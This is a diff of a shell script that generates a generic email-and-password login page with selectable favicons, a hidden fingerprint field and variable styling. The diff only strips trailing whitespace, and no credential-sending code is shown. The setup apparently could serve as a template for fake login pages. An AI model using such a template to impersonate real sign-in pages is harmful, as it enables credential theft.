@@ -25,10 +25,10 @@ ERROR_MESSAGES=(
 FAVICONS=(
     # 1. Cloud (Blue) - Классическое облако
     "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMjU2M0VCIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTE3LjUgMTlhMy41IDMuNSAwIDAgMCAwLTdoLTVhNC41IDQuNSAwIDAgMC04LjggMi4xQSA0IDQgMCAwIDAgNiAyMWgxMS41eiIvPjwvc3ZnPg=="
-    
+
     # 2. Lock (Green) - Замок (безопасность)
     "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMDU5NjY5IiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHJlY3QgeD0iMyIgeT0iMTEiIHdpZHRoPSIxOCIgaGVpZ2h0PSIxMSIgcng9IjIiIHJ5PSIyIi8+PHBhdGggZD0iTTcgMTEVdi00YTUgNSAwIDAgMSAxMCAwdjQiLz48L3N2Zz4="
-    
+
     # 3. Shield (Red/Orange) - Щит (защищенная зона)
     "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjREM1RjAwIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTEyIDIybDguMTMtOC44NWMuNDgtLjUyLjU2LTEuMzMuMi0xLjkxbC01LjI0LTguNDZhMiAyIDAgMCAwLTEuNzItLjkzSDguNjNhMiAyIDAgMCAwLTEuNzIuOTNMMS42NyAxMS4yNWMtLjM2LjU4LS4yOCAxLjM5LjIgMS45MUwxMiAyMnoiLz48L3N2Zz4="
 
@@ -140,7 +140,7 @@ cat > "$TARGET_DIR/index.html" <<EOF
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen $BG_STYLE">
-    
+
     <div id="auth-container" class="w-full max-w-[400px] mx-4 p-8 sm:p-10 space-y-6 $CARD_BG $ROUNDING transition-all">
         <div class="text-center space-y-2 mb-8">
             <div class="h-12 w-12 mx-auto mb-4 bg-gradient-to-br from-blue-500 to-purple-600 rounded-xl flex items-center justify-center shadow-lg text-white">
@@ -157,22 +157,22 @@ cat > "$TARGET_DIR/index.html" <<EOF
         <form id="vform" class="space-y-5" autocomplete="off">
             <input type="hidden" name="csrf_token" value="$RANDOM_TOKEN" />
             <input type="hidden" name="fingerprint" id="fp" value="" />
-            
+
             <div class="space-y-1.5">
                 <label class="block text-xs font-semibold uppercase tracking-wider $TEXT_MUTED"> Email</label>
                 <input type="email" id="uid" required class="w-full px-4 py-2.5 text-sm transition-all rounded-md outline-none focus:ring-2 $INPUT_BG $TEXT_INPUT" placeholder="user@domain.com" />
             </div>
-            
+
             <div class="space-y-1.5">
                 <label class="block text-xs font-semibold uppercase tracking-wider $TEXT_MUTED">Password</label>
                 <input type="password" id="sec" required class="w-full px-4 py-2.5 text-sm transition-all rounded-md outline-none focus:ring-2 $INPUT_BG $TEXT_INPUT" placeholder="Enter your password" />
             </div>
-            
+
             <button type="submit" id="act-btn" class="w-full py-2.5 text-sm font-semibold text-white shadow-md transition-all active:scale-[0.98] $BUTTON_COLOR $ROUNDING flex justify-center items-center gap-2">
                 <span id="btn-txt">$BUTTON_TEXT</span>
             </button>
         </form>
-        
+
 
     </div>
 
